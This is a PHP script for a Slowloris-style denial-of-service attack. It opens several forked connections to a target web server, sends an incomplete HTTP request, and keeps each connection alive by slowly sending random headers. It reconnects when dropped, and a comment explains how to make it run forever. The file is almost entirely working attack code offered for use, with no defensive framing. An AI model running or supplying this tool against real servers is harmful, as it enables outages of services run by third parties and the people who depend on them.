<?php

function output($log, $pid = null)
{
    print date('Y-m-d H:i:s') . ($pid ? (", PID: " . $pid) : "") . ", " . $log . "\r\n";
}

function attack($server, $host, $pause = 10, $maxExecutionTime = 36000, $pid = null)
{
    $basicRequest = "GET / HTTP/1.1\r\n";
    $basicRequest .= "Host: $host\r\n";
    $basicRequest .= "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36";
    $basicRequest .= "Keep-Alive: 900\r\n";
    $basicRequest .= "Content-Length: " . rand(1000, 100000) . "\r\n";
    $basicRequest .= "Accept: *.*\r\n";
    $basicRequest .= "X-Identity " . rand(1, 10) . ": " . rand(1, 100000) . "\r\n";

    if (!$sockId = fsockopen($server, 80, $errno, $errstr)) {
        output("Attacker can't start, connection error: " . $errstr, $pid);
        die;
    }

    //send first part of the request
    if (!fwrite($sockId, $basicRequest)) {
        output("Attacker failed, basic request part wasn't sent", $pid);
        die;
    }
    output("Attacker started, basic request sent to the socket", $pid);


    $startTime = time();
    //to make the attacker infinite just replace the following line with  while(true)
    while (time() < $startTime + $maxExecutionTime) {
        $newHeader = "Y-Identity " . rand(1, 10) . ": " . rand(1, 100000) . "\r\n";
        if (fwrite($sockId, $newHeader)) {
            output("Header " . $newHeader . " sent, continue attack", $pid);
            sleep($pause);
        } else {
            output("Connection closed by server, starting a new attack", $pid);
            $sockId = fsockopen($server, 80, $errno, $errstr);
            fwrite($sockId, $basicRequest);
        }
    }
    output("Attacker finished by time", $pid);
}


function main()
{
    //parse config
    $configFile = fopen("attacker.config", "r");
    $settings = [];
    while ($setting = fgets($configFile, 256)) {
        list($key, $value) = explode(":", $setting);
        $settings[$key] = trim($value);
    }

    $server = $settings['server'] ?? "127.0.0.1";
    $host = $settings['host'] ?? "localhost";
    $processesNumber = $settings['procnum'] ?? 4;
    $maxExecutionTime = $settings['time'] ?? 120;

    $status = 1;

    $pids = [];
    for ($i = 0; $i < $processesNumber; $i++) {
        $pid = pcntl_fork();
        if ($pid == -1) {
            die("Error forking, attacker not started");
        } else if ($pid == 0) {
            //child process
            attack($server, $host, $processesNumber, $maxExecutionTime, getmypid());
            exit(0);
        } else {
            //parent process
            $pids[] = $pid;
        }
    }
    foreach ($pids as $pid) {
        pcntl_waitpid($pid, $status);
    }
}

main();
